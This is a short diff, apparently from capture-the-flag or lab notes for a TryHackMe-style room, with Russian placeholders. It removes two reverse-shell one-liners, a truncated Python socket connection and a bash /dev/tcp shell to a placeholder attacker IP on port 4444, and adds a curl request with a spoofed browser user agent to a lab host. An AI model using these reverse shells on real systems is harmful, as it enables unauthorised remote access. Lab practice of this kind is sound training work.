@@ -1,2 +1,1 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>”,<Port number>))
-/bin/bash -c 'bash -i >& /dev/tcp/ТВОЙ_IP/4444 0>&1' #
+curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -v http://delivery.cupidsarrow.thm/ПУТЬ_ИЗ_ПИСЬМА
